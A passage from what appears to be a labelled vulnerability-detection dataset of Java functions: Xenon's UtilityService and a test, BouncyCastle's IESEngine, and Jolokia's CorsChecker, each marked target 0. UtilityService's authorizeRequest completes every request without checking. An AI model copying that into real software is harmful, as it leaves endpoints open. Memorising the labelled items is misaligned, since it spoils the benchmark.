assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(serviceSubscriptionUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(serviceTemplateUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n        failureResponse = sender.sendAndWaitFailure(Operation.createGet(serviceSynchUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, failureResponse.op.getStatusCode());\n\n        response = sender.sendAndWait(Operation.createGet(serviceUiUri));\n        assertNotEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n\n    }\n\n}\n", "target": 0}
{"idx": 1048, "func": "package io.onedev.server.product;\n\npublic class Test {\n\n\t@org.junit.Test\n\tpublic void test() {\n\t}\t\t\n\n}", "target": 0}
{"idx": 1049, "func": "package org.bouncycastle.crypto.engines;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.math.BigInteger;\n\nimport org.bouncycastle.crypto.BasicAgreement;\nimport org.bouncycastle.crypto.BufferedBlockCipher;\nimport org.bouncycastle.crypto.CipherParameters;\nimport org.bouncycastle.crypto.DerivationFunction;\nimport org.bouncycastle.crypto.EphemeralKeyPair;\nimport org.bouncycastle.crypto.InvalidCipherTextException;\nimport org.bouncycastle.crypto.KeyParser;\nimport org.bouncycastle.crypto.Mac;\nimport org.bouncycastle.crypto.generators.EphemeralKeyPairGenerator;\nimport org.bouncycastle.crypto.params.AsymmetricKeyParameter;\nimport org.bouncycastle.crypto.params.IESParameters;\nimport org.bouncycastle.crypto.params.IESWithCipherParameters;\nimport org.bouncycastle.crypto.params.KDFParameters;\nimport org.bouncycastle.crypto.params.KeyParameter;\nimport org.bouncycastle.crypto.params.ParametersWithIV;\nimport org.bouncycastle.util.Arrays;\nimport org.bouncycastle.util.BigIntegers;\nimport org.bouncycastle.util.Pack;\n\n/**\n * Support class for constructing integrated encryption ciphers\n * for doing basic message exchanges on top of key agreement ciphers.\n * Follows the description given in IEEE Std 1363a.\n */\npublic class IESEngine\n{\n    BasicAgreement agree;\n    DerivationFunction kdf;\n    Mac mac;\n    BufferedBlockCipher cipher;\n    byte[] macBuf;\n\n    boolean forEncryption;\n    CipherParameters privParam, pubParam;\n    IESParameters param;\n\n    byte[] V;\n    private EphemeralKeyPairGenerator keyPairGenerator;\n    private KeyParser keyParser;\n    private byte[] IV;\n\n    /**\n     * set up for use with stream mode, where the key derivation function\n     * is used to provide a stream of bytes to xor with the message.\n     *\n     * @param agree the key agreement used as the basis for the encryption\n     * @param kdf   the key derivation function used for byte generation\n     * @param mac   the message authentication code generator for the message\n     */\n    public IESEngine(\n        BasicAgreement agree,\n        DerivationFunction kdf,\n        Mac mac)\n    {\n        this.agree = agree;\n        this.kdf = kdf;\n        this.mac = mac;\n        this.macBuf = new byte[mac.getMacSize()];\n        this.cipher = null;\n    }\n\n\n    /**\n     * Set up for use in conjunction with a block cipher to handle the\n     * message.It is <b>strongly</b> recommended that the cipher is not in ECB mode.\n     *\n     * @param agree  the key agreement used as the basis for the encryption\n     * @param kdf    the key derivation function used for byte generation\n     * @param mac    the message authentication code generator for the message\n     * @param cipher the cipher to used for encrypting the message\n     */\n    public IESEngine(\n        BasicAgreement agree,\n        DerivationFunction kdf,\n        Mac mac,\n        BufferedBlockCipher cipher)\n    {\n        this.agree = agree;\n        this.kdf = kdf;\n        this.mac = mac;\n        this.macBuf = new byte[mac.getMacSize()];\n        this.cipher = cipher;\n    }\n\n    /**\n     * Initialise the encryptor.\n     *\n     * @param forEncryption whether or not this is encryption/decryption.\n     * @param privParam     our private key parameters\n     * @param pubParam      the recipient's/sender's public key parameters\n     * @param params        encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     */\n    public void init(\n        boolean forEncryption,\n        CipherParameters privParam,\n        CipherParameters pubParam,\n        CipherParameters params)\n    {\n        this.forEncryption = forEncryption;\n        this.privParam = privParam;\n        this.pubParam = pubParam;\n        this.V = new byte[0];\n\n        extractParams(params);\n    }\n\n    /**\n     * Initialise the decryptor.\n     *\n     * @param publicKey      the recipient's/sender's public key parameters\n     * @param params         encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     * @param ephemeralKeyPairGenerator             the ephemeral key pair generator to use.\n     */\n    public void init(AsymmetricKeyParameter publicKey, CipherParameters params, EphemeralKeyPairGenerator ephemeralKeyPairGenerator)\n    {\n        this.forEncryption = true;\n        this.pubParam = publicKey;\n        this.keyPairGenerator = ephemeralKeyPairGenerator;\n\n        extractParams(params);\n    }\n\n    /**\n     * Initialise the encryptor.\n     *\n     * @param privateKey      the recipient's private key.\n     * @param params          encoding and derivation parameters, may be wrapped to include an IV for an underlying block cipher.\n     * @param publicKeyParser the parser for reading the ephemeral public key.\n     */\n    public void init(AsymmetricKeyParameter privateKey, CipherParameters params, KeyParser publicKeyParser)\n    {\n        this.forEncryption = false;\n        this.privParam = privateKey;\n        this.keyParser = publicKeyParser;\n\n        extractParams(params);\n    }\n\n    private void extractParams(CipherParameters params)\n    {\n        if (params instanceof ParametersWithIV)\n        {\n            this.IV = ((ParametersWithIV)params).getIV();\n            this.param = (IESParameters)((ParametersWithIV)params).getParameters();\n        }\n        else\n        {\n            this.IV = null;\n            this.param = (IESParameters)params;\n        }\n    }\n\n    public BufferedBlockCipher getCipher()\n    {\n        return cipher;\n    }\n\n    public Mac getMac()\n    {\n        return mac;\n    }\n\n    private byte[] encryptBlock(\n        byte[] in,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        byte[] C = null, K = null, K1 = null, K2 = null;\n        int len;\n\n        if (cipher == null)\n        {\n            // Streaming mode.\n            K1 = new byte[inLen];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n\n            if (V.length != 0)\n            {\n                System.arraycopy(K, 0, K2, 0, K2.length);\n                System.arraycopy(K, K2.length, K1, 0, K1.length);\n            }\n            else\n            {\n                System.arraycopy(K, 0, K1, 0, K1.length);\n                System.arraycopy(K, inLen, K2, 0, K2.length);\n            }\n\n            C = new byte[inLen];\n\n            for (int i = 0; i != inLen; i++)\n            {\n                C[i] = (byte)(in[inOff + i] ^ K1[i]);\n            }\n            len = inLen;\n        }\n        else\n        {\n            // Block cipher mode.\n            K1 = new byte[((IESWithCipherParameters)param).getCipherKeySize() / 8];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n            System.arraycopy(K, 0, K1, 0, K1.length);\n            System.arraycopy(K, K1.length, K2, 0, K2.length);\n\n            // If iv provided use it to initialise the cipher\n            if (IV != null)\n            {\n                cipher.init(true, new ParametersWithIV(new KeyParameter(K1), IV));\n            }\n            else\n            {\n                cipher.init(true, new KeyParameter(K1));    \n            }\n            \n            C = new byte[cipher.getOutputSize(inLen)];\n            len = cipher.processBytes(in, inOff, inLen, C, 0);\n            len += cipher.doFinal(C, len);\n        }\n\n\n        // Convert the length of the encoding vector into a byte array.\n        byte[] P2 = param.getEncodingV();\n        byte[] L2 = null;\n        if (V.length != 0)\n        {\n            L2 = getLengthTag(P2);\n        }\n\n\n        // Apply the MAC.\n        byte[] T = new byte[mac.getMacSize()];\n\n        mac.init(new KeyParameter(K2));\n        mac.update(C, 0, C.length);\n        if (P2 != null)\n        {\n            mac.update(P2, 0, P2.length);\n        }\n        if (V.length != 0)\n        {\n            mac.update(L2, 0, L2.length);\n        }\n        mac.doFinal(T, 0);\n\n\n        // Output the triple (V,C,T).\n        byte[] Output = new byte[V.length + len + T.length];\n        System.arraycopy(V, 0, Output, 0, V.length);\n        System.arraycopy(C, 0, Output, V.length, len);\n        System.arraycopy(T, 0, Output, V.length + len, T.length);\n        return Output;\n    }\n\n    private byte[] decryptBlock(\n        byte[] in_enc,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        byte[] M, K, K1, K2;\n        int len = 0;\n\n        // Ensure that the length of the input is greater than the MAC in bytes\n        if (inLen < V.length + mac.getMacSize())\n        {\n            throw new InvalidCipherTextException(\"Length of input must be greater than the MAC and V combined\");\n        }\n\n        // note order is important: set up keys, do simple encryptions, check mac, do final encryption.\n        if (cipher == null)\n        {\n            // Streaming mode.\n            K1 = new byte[inLen - V.length - mac.getMacSize()];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n\n            if (V.length != 0)\n            {\n                System.arraycopy(K, 0, K2, 0, K2.length);\n                System.arraycopy(K, K2.length, K1, 0, K1.length);\n            }\n            else\n            {\n                System.arraycopy(K, 0, K1, 0, K1.length);\n                System.arraycopy(K, K1.length, K2, 0, K2.length);\n            }\n\n            // process the message\n            M = new byte[K1.length];\n\n            for (int i = 0; i != K1.length; i++)\n            {\n                M[i] = (byte)(in_enc[inOff + V.length + i] ^ K1[i]);\n            }\n        }\n        else\n        {\n            // Block cipher mode.        \n            K1 = new byte[((IESWithCipherParameters)param).getCipherKeySize() / 8];\n            K2 = new byte[param.getMacKeySize() / 8];\n            K = new byte[K1.length + K2.length];\n\n            kdf.generateBytes(K, 0, K.length);\n            System.arraycopy(K, 0, K1, 0, K1.length);\n            System.arraycopy(K, K1.length, K2, 0, K2.length);\n\n            // If IV provide use it to initialize the cipher\n            if (IV != null)\n            {\n                cipher.init(false, new ParametersWithIV(new KeyParameter(K1), IV));\n            }\n            else\n            {\n                cipher.init(false, new KeyParameter(K1));\n            }\n\n            M = new byte[cipher.getOutputSize(inLen - V.length - mac.getMacSize())];\n\n            // do initial processing\n            len = cipher.processBytes(in_enc, inOff + V.length, inLen - V.length - mac.getMacSize(), M, 0);\n        }\n\n        // Convert the length of the encoding vector into a byte array.\n        byte[] P2 = param.getEncodingV();\n        byte[] L2 = null;\n        if (V.length != 0)\n        {\n            L2 = getLengthTag(P2);\n        }\n\n        // Verify the MAC.\n        int end = inOff + inLen;\n        byte[] T1 = Arrays.copyOfRange(in_enc, end - mac.getMacSize(), end);\n\n        byte[] T2 = new byte[T1.length];\n        mac.init(new KeyParameter(K2));\n        mac.update(in_enc, inOff + V.length, inLen - V.length - T2.length);\n\n        if (P2 != null)\n        {\n            mac.update(P2, 0, P2.length);\n        }\n        if (V.length != 0)\n        {\n            mac.update(L2, 0, L2.length);\n        }\n        mac.doFinal(T2, 0);\n\n        if (!Arrays.constantTimeAreEqual(T1, T2))\n        {\n            throw new InvalidCipherTextException(\"invalid MAC\");\n        }\n\n        if (cipher == null)\n        {\n            return M;\n        }\n        else\n        {\n            len += cipher.doFinal(M, len);\n\n            return Arrays.copyOfRange(M, 0, len);\n        }\n    }\n\n\n    public byte[] processBlock(\n        byte[] in,\n        int inOff,\n        int inLen)\n        throws InvalidCipherTextException\n    {\n        if (forEncryption)\n        {\n            if (keyPairGenerator != null)\n            {\n                EphemeralKeyPair ephKeyPair = keyPairGenerator.generate();\n\n                this.privParam = ephKeyPair.getKeyPair().getPrivate();\n                this.V = ephKeyPair.getEncodedPublicKey();\n            }\n        }\n        else\n        {\n            if (keyParser != null)\n            {\n                ByteArrayInputStream bIn = new ByteArrayInputStream(in, inOff, inLen);\n\n                try\n                {\n                    this.pubParam = keyParser.readKey(bIn);\n                }\n                catch (IOException e)\n                {\n                    throw new InvalidCipherTextException(\"unable to recover ephemeral public key: \" + e.getMessage(), e);\n                }\n                catch (IllegalArgumentException e)\n                {\n                    throw new InvalidCipherTextException(\"unable to recover ephemeral public key: \" + e.getMessage(), e);\n                }\n\n                int encLength = (inLen - bIn.available());\n                this.V = Arrays.copyOfRange(in, inOff, inOff + encLength);\n            }\n        }\n\n        // Compute the common value and convert to byte array. \n        agree.init(privParam);\n        BigInteger z = agree.calculateAgreement(pubParam);\n        byte[] Z = BigIntegers.asUnsignedByteArray(agree.getFieldSize(), z);\n\n        // Create input to KDF.  \n        if (V.length != 0)\n        {\n            byte[] VZ = Arrays.concatenate(V, Z);\n            Arrays.fill(Z, (byte)0);\n            Z = VZ;\n        }\n\n        try\n        {\n            // Initialise the KDF.\n            KDFParameters kdfParam = new KDFParameters(Z, param.getDerivationV());\n            kdf.init(kdfParam);\n\n            return forEncryption\n                ? encryptBlock(in, inOff, inLen)\n                : decryptBlock(in, inOff, inLen);\n        }\n        finally\n        {\n            Arrays.fill(Z, (byte)0);\n        }\n    }\n\n    // as described in Shroup's paper and P1363a\n    protected byte[] getLengthTag(byte[] p2)\n    {\n        byte[] L2 = new byte[8];\n        if (p2 != null)\n        {\n            Pack.longToBigEndian(p2.length * 8L, L2, 0);\n        }\n        return L2;\n    }\n}\n", "target": 0}
{"idx": 1050, "func": "package org.jolokia.restrictor.policy;\n\n/*\n * Copyright 2009-2013 Roland Huss\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *       http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\nimport org.w3c.dom.*;\n\n/**\n * Check for location restrictions for CORS based cross browser platform requests\n *\n * @author roland\n * @since 07.04.12\n */\npublic class CorsChecker extends AbstractChecker<String> {\n\n    private boolean strictChecking = false;\n\n    private List<Pattern> patterns;\n\n    /**\n     * Constructor buiilding up this checker from the XML document provided.\n     * CORS sections look like\n     * <pre>\n     *     &lt;cors&gt;\n     *       &lt;allow-origin&gt;http://jolokia.org&lt;allow-origin&gt;\n     *       &lt;allow-origin&gt;*://*.jmx4perl.org&gt;\n     *\n     *       &lt;strict-checking/&gt;\n     *     &lt;/cors&gt;\n     * </pre>\n     *\n     * @param pDoc the overall policy documents\n     */\n    public CorsChecker(Document pDoc) {\n        NodeList corsNodes = pDoc.getElementsByTagName(\"cors\");\n        if (corsNodes.getLength() > 0) {\n            patterns = new ArrayList<Pattern>();\n            for (int i = 0; i < corsNodes.getLength(); i++) {\n                Node corsNode = corsNodes.item(i);\n                NodeList nodes = corsNode.getChildNodes();\n                for (int j = 0;j <nodes.getLength();j++) {\n                    Node node = nodes.item(j);\n                    if (node.getNodeType() != Node.ELEMENT_NODE) {\n                        continue;\n                    }\n                    assertNodeName(node,\"allow-origin\",\"strict-checking\");\n                    if (node.getNodeName().equals(\"allow-origin\")) {\n                        String p = node.getTextContent().trim().toLowerCase();\n                        p = Pattern.quote(p).replace(\"*\", \"\\\\E.*\\\\Q\");\n                        patterns.add(Pattern.compile(\"^\" + p + \"$\"));\n                    } else if (node.getNodeName().equals(\"strict-checking\")) {\n                        strictChecking = true;\n                    }\n                }\n            }\n        }\n    }\n\n    /** {@inheritDoc} */\n    @Override\n    public boolean check(String pArg) {\n        return check(pArg,false);\n    }\n\n    public boolean check(String pOrigin, boolean pIsStrictCheck) {\n        // Method called during strict checking but we have not configured that\n        // So the check passes always.\n        if (pIsStrictCheck && !strictChecking) {\n            return true;\n        }\n\n        if (patterns == null || patterns.size() == 0) {\n            return true;\n        }\n        for (Pattern pattern : patterns) {\n            if (pattern.matcher(pOrigin).matches()) {\n                return true;\n            }\n        }\n        return false;\n    }\n}\n", "target": 0}
{"idx": 1051, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport java.io.NotActiveException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URI;\nimport java.net.URLDecoder;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map.Entry;\nimport java.util.concurrent.ConcurrentSkipListMap;\nimport java.util.logging.Level;\n\nimport com.vmware.xenon.common.Operation.AuthorizationContext;\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceSubscriptionState.ServiceSubscriber;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.UiContentService;\n\n\n/**\n * Utility service managing the various URI control REST APIs for each service instance. A single\n * utility service instance manages operations on multiple URI suffixes (/stats, /subscriptions,\n * etc) in order to reduce runtime overhead per service instance\n */\npublic class UtilityService implements Service {\n    private transient Service parent;\n    private ServiceStats stats;\n    private ServiceSubscriptionState subscriptions;\n    private UiContentService uiService;\n\n    public UtilityService() {\n    }\n\n    public UtilityService setParent(Service parent) {\n        this.parent = parent;\n        return this;\n    }\n\n    @Override\n    public void authorizeRequest(Operation op) {\n        op.complete();\n    }\n\n    @Override\n    public void handleRequest(Operation op) {\n        String uriPrefix = this.parent.getSelfLink() + ServiceHost.SERVICE_URI_SUFFIX_UI;\n\n        if (op.getUri().getPath().startsWith(uriPrefix)) {\n            // startsWith catches all /factory/instance/ui/some-script.js\n            handleUiRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_STATS)) {\n            handleStatsRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_SUBSCRIPTIONS)) {\n            handleSubscriptionsRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_TEMPLATE)) {\n            handleDocumentTemplateRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_CONFIG)) {\n            this.parent.handleConfigurationRequest(op);\n        } else if (op.getUri().getPath().endsWith(ServiceHost.SERVICE_URI_SUFFIX_AVAILABLE)) {\n            handleAvailableRequest(op);\n        } else {\n            op.fail(new UnknownHostException());\n        }\n    }\n\n    @Override\n    public void handleCreate(Operation post) {\n        post.complete();\n    }\n\n    @Override\n    public void handleStart(Operation startPost) {\n        startPost.complete();\n    }\n\n    @Override\n    public void handleStop(Operation op) {\n        op.complete();\n    }\n\n    @Override\n    public void handleRequest(Operation op, OperationProcessingStage opProcessingStage) {\n        handleRequest(op);\n    }\n\n    private void handleAvailableRequest(Operation op) {\n        if (op.getAction() == Action.GET) {\n            if (this.parent.getProcessingStage() != ProcessingStage.PAUSED\n                    && this.parent.getProcessingStage() != ProcessingStage.AVAILABLE) {\n                // processing stage takes precedence over isAvailable statistic\n                op.fail(Operation.STATUS_CODE_UNAVAILABLE);\n                return;\n            }\n            if (this.stats == null) {\n                op.complete();\n                return;\n            }\n            ServiceStat st = this.getStat(STAT_NAME_AVAILABLE, false);\n            if (st == null || st.latestValue == 1.0) {\n                op.complete();\n                return;\n            }\n            op.fail(Operation.STATUS_CODE_UNAVAILABLE);\n        } else if (op.getAction() == Action.PATCH || op.getAction() == Action.PUT) {\n            if (!op.hasBody()) {\n                op.fail(new IllegalArgumentException(\"body is required\"));\n                return;\n            }\n            ServiceStat st = op.getBody(ServiceStat.class);\n            if (!STAT_NAME_AVAILABLE.equals(st.name)) {\n                op.fail(new IllegalArgumentException(\n                        \"body must be of type ServiceStat and name must be \"\n                                + STAT_NAME_AVAILABLE));\n                return;\n            }\n            handleStatsRequest(op);\n        } else {\n            getHost().failRequestActionNotSupported(op);\n        }\n    }\n\n    private void handleSubscriptionsRequest(Operation op) {\n        synchronized (this) {\n            if (this.subscriptions == null) {\n                this.subscriptions = new ServiceSubscriptionState();\n                this.subscriptions.subscribers = new ConcurrentSkipListMap<>();\n            }\n        }\n\n        ServiceSubscriber body = null;\n        if (op.hasBody()) {\n            body = op.getBody(ServiceSubscriber.class);\n            if (body.reference == null) {\n                op.fail(new IllegalArgumentException(\"reference is required\"));\n                return;\n            }\n        }\n\n        switch (op.getAction()) {\n        case POST:\n            // synchronize to avoid concurrent modification during serialization for GET\n            synchronized (this.subscriptions) {\n                this.subscriptions.subscribers.put(body.reference, body);\n            }\n            if (!body.replayState) {\n                break;\n            }\n            // if replayState is set, replay the current state to the subscriber\n            URI notificationURI = body.reference;\n            this.parent.sendRequest(Operation.createGet(this, this.parent.getSelfLink())\n                    .setCompletion(\n                            (o, e) -> {\n                                if (e != null) {\n                                    op.fail(new IllegalStateException(\n                                            \"Unable to get current state\"));\n                                    return;\n                                }\n                                Operation putOp = Operation\n                                        .createPut(notificationURI)\n                                        .setBodyNoCloning(o.getBody(this.parent.getStateType()))\n                                        .addPragmaDirective(\n                                                Operation.PRAGMA_DIRECTIVE_NOTIFICATION)\n                                        .setReferer(getUri());\n                                this.parent.sendRequest(putOp);\n                            }));\n\n            break;\n        case DELETE:\n            // synchronize to avoid concurrent modification during serialization for GET\n            synchronized (this.subscriptions) {\n                this.subscriptions.subscribers.remove(body.reference);\n            }\n            break;\n        case GET:\n            ServiceDocument rsp;\n            synchronized (this.subscriptions) {\n                rsp = Utils.clone(this.subscriptions);\n            }\n            op.setBody(rsp);\n            break;\n        default:\n            op.fail(new NotActiveException());\n            break;\n\n        }\n\n        op.complete();\n    }\n\n    public boolean hasSubscribers() {\n        ServiceSubscriptionState subscriptions = this.subscriptions;\n        return subscriptions != null\n                && subscriptions.subscribers != null\n                && !subscriptions.subscribers.isEmpty();\n    }\n\n    public boolean hasStats() {\n        ServiceStats stats = this.stats;\n        return stats != null && stats.entries != null && !stats.entries.isEmpty();\n    }\n\n    public void notifySubscribers(Operation op) {\n        try {\n            if (op.getAction() == Action.GET) {\n                return;\n            }\n\n            if (!this.hasSubscribers()) {\n                return;\n            }\n\n            long now = Utils.getNowMicrosUtc();\n\n            Operation clone = op.clone();\n            clone.addPragmaDirective(Operation.PRAGMA_DIRECTIVE_NOTIFICATION);\n            for (Entry<URI, ServiceSubscriber> e : this.subscriptions.subscribers.entrySet()) {\n                ServiceSubscriber s = e.getValue();\n                notifySubscriber(now, clone, s);\n            }\n\n            if (!performSubscriptionsMaintenance(now)) {\n                return;\n            }\n        } catch (Throwable e) {\n            this.parent.getHost().log(Level.WARNING,\n                    \"Uncaught exception notifying subscribers for %s: %s\",\n                    this.parent.getSelfLink(), Utils.toString(e));\n        }\n    }\n\n    private void notifySubscriber(long now, Operation clone, ServiceSubscriber s) {\n        synchronized (s) {\n            if (s.failedNotificationCount != null) {\n                // indicate to the subscriber that they missed notifications and should retrieve latest state\n                clone.addPragmaDirective(Operation.PRAGMA_DIRECTIVE_SKIPPED_NOTIFICATIONS);\n            }\n        }\n\n        CompletionHandler c = (o, ex) -> {\n            s.documentUpdateTimeMicros = Utils.getNowMicrosUtc();\n            synchronized (s) {\n                if (ex != null) {\n                    if (s.failedNotificationCount == null) {\n                        s.failedNotificationCount = 0L;\n                        s.initialFailedNotificationTimeMicros = now;\n                    }\n                    s.failedNotificationCount++;\n                    return;\n                }\n\n                if (s.failedNotificationCount != null) {\n                    // the subscriber is available again.\n                    s.failedNotificationCount = null;\n                    s.initialFailedNotificationTimeMicros = null;\n                }\n            }\n        };\n\n        this.parent.sendRequest(clone.setUri(s.reference).setCompletion(c));\n    }\n\n    private boolean performSubscriptionsMaintenance(long now) {\n        List<URI> subscribersToDelete = null;\n        synchronized (this) {\n            if (this.subscriptions == null) {\n                return false;\n            }\n\n            Iterator<Entry<URI, ServiceSubscriber>> it = this.subscriptions.subscribers.entrySet()\n                    .iterator();\n            while (it.hasNext()) {\n                Entry<URI, ServiceSubscriber> e = it.next();\n                ServiceSubscriber s = e.getValue();\n                boolean remove = false;\n                synchronized (s) {\n                    if (s.documentExpirationTimeMicros != 0 && s.documentExpirationTimeMicros < now) {\n                        remove = true;\n                    } else if (s.notificationLimit != null) {\n                        if (s.notificationCount == null) {\n                            s.notificationCount = 0L;\n                        }\n                        if (++s.notificationCount >= s.notificationLimit) {\n                            remove = true;\n                        }\n                    } else if (s.failedNotificationCount != null\n                            && s.failedNotificationCount > ServiceSubscriber.NOTIFICATION_FAILURE_LIMIT) {\n                        if (now - s.initialFailedNotificationTimeMicros > getHost()\n                                .getMaintenanceIntervalMicros()) {\n                            remove = true;\n                        }\n                    }\n                }\n\n                if (!remove) {\n                    continue;\n                }\n\n                it.remove();\n                if (subscribersToDelete == null) {\n                    subscribersToDelete = new ArrayList<>();\n                }\n                subscribersToDelete.add(s.reference);\n                continue;\n            }\n        }\n\n        if (subscribersToDelete != null) {\n            for (URI subscriber : subscribersToDelete) {\n                this.parent.sendRequest(Operation.createDelete(subscriber));\n            }\n        }\n\n        return true;\n    }\n\n    private void handleUiRequest(Operation op) {\n        if (op.getAction() != Action.GET) {\n            op.fail(new IllegalArgumentException(\"Action not supported\"));\n            return;\n        }\n\n        if (!this.parent.hasOption(ServiceOption.HTML_USER_INTERFACE)) {\n            String servicePath = UriUtils.buildUriPath(ServiceUriPaths.UI_SERVICE_BASE_URL, op\n                    .getUri().getPath());\n            String defaultHtmlPath = UriUtils.buildUriPath(servicePath.substring(0,\n                    servicePath.length() - ServiceUriPaths.UI_PATH_SUFFIX.length()),\n                    ServiceUriPaths.UI_SERVICE_HOME);\n\n            redirectGetToHtmlUiResource(op, defaultHtmlPath);\n            return;\n        }\n\n        if (this.uiService == null) {\n            this.uiService = new UiContentService() {\n            };\n            this.uiService.setHost(this.parent.getHost());\n        }\n\n        // simulate a full service deployed at the utility endpoint /service/ui\n        String selfLink = this.parent.getSelfLink() + ServiceHost.SERVICE_URI_SUFFIX_UI;\n        this.uiService.handleUiGet(selfLink, this.parent, op);\n    }\n\n    public void redirectGetToHtmlUiResource(Operation op, String htmlResourcePath) {\n        // redirect using relative url without host:port\n        // not so much optimization as handling the case of port forwarding/containers\n        try {\n            op.addResponseHeader(Operation.LOCATION_HEADER,\n                    URLDecoder.decode(htmlResourcePath, Utils.CHARSET));\n        } catch (UnsupportedEncodingException e) {\n            throw new IllegalStateException(e);\n        }\n\n        op.setStatusCode(Operation.STATUS_CODE_MOVED_TEMP);\n        op.complete();\n    }\n\n    private void handleStatsRequest(Operation op) {\n        switch (op.getAction()) {\n        case PUT:\n            ServiceStats.ServiceStat stat = op\n                    .getBody(ServiceStats.ServiceStat.class);\n            if (stat.kind == null) {\n                op.fail(new IllegalArgumentException(\"kind is required\"));\n                return;\n            }\n            if (stat.kind.equals(ServiceStats.ServiceStat.KIND)) {\n                if (stat.name == null) {\n                    op.fail(new IllegalArgumentException(\"stat name is required\"));\n                    return;\n                }\n                replaceSingleStat(stat);\n            } else if (stat.kind.equals(ServiceStats.KIND)) {\n                ServiceStats stats = op.getBody(ServiceStats.class);\n                if (stats.entries == null || stats.entries.isEmpty()) {\n                    op.fail(new IllegalArgumentException(\"stats entries need to be defined\"));\n                    return;\n                }\n                replaceAllStats(stats);\n            } else {\n                op.fail(new IllegalArgumentException(\"operation not supported for kind\"));\n                return;\n            }\n            op.complete();\n            break;\n        case POST:\n            ServiceStats.ServiceStat newStat = op.getBody(ServiceStats.ServiceStat.class);\n            if (newStat.name == null) {\n                op.fail(new IllegalArgumentException(\"stat name is required\"));\n                return;\n            }\n            // create a stat object if one does not exist\n            ServiceStats.ServiceStat existingStat = this.getStat(newStat.name);\n            if (existingStat == null) {\n                op.fail(new IllegalArgumentException(\"stat does not exist\"));\n                return;\n            }\n            initializeOrSetStat(existingStat, newStat);\n            op.complete();\n            break;\n        case DELETE:\n            // TODO support removing stats externally - do we need this?\n            op.fail(new NotActiveException());\n            break;\n        case PATCH:\n            newStat = op.getBody(ServiceStats.ServiceStat.class);\n            if (newStat.name == null) {\n                op.fail(new IllegalArgumentException(\"stat name is required\"));\n                return;\n            }\n            // if an existing stat by this name exists, adjust the stat value, else this is a no-op\n            existingStat = this.getStat(newStat.name, false);\n            if (existingStat == null) {\n                op.fail(new IllegalArgumentException(\"stat to patch does not exist\"));\n                return;\n            }\n            adjustStat(existingStat, newStat.latestValue);\n            op.complete();\n            break;\n        case GET:\n            if (this.stats == null) {\n                ServiceStats s = new ServiceStats();\n                populateDocumentProperties(s);\n                op.setBody(s).complete();\n            } else {\n                ServiceDocument rsp;\n                synchronized (this.stats) {\n                    rsp = populateDocumentProperties(this.stats);\n                    rsp = Utils.clone(rsp);\n                }\n                op.setBodyNoCloning(rsp);\n                op.complete();\n            }\n            break;\n        default:\n            op.fail(new NotActiveException());\n            break;\n\n        }\n    }\n\n    private ServiceStats populateDocumentProperties(ServiceStats stats) {\n        ServiceStats clone = new ServiceStats();\n        clone.entries = stats.entries;\n        clone.documentUpdateTimeMicros = stats.documentUpdateTimeMicros;\n        clone.documentSelfLink = UriUtils.buildUriPath(this.parent.getSelfLink(),\n                ServiceHost.SERVICE_URI_SUFFIX_STATS);\n        clone.documentOwner = getHost().getId();\n        clone.documentKind = Utils.buildKind(ServiceStats.class);\n        return clone;\n    }\n\n    private void handleDocumentTemplateRequest(Operation op) {\n        if (op.getAction() != Action.GET) {\n            op.fail(new NotActiveException());\n            return;\n        }\n        ServiceDocument template = this.parent.getDocumentTemplate();\n        String serializedTemplate = Utils.toJsonHtml(template);\n        op.setBody(serializedTemplate).complete();\n    }\n\n    @Override\n    public void handleConfigurationRequest(Operation op) {\n        this.parent.handleConfigurationRequest(op);\n    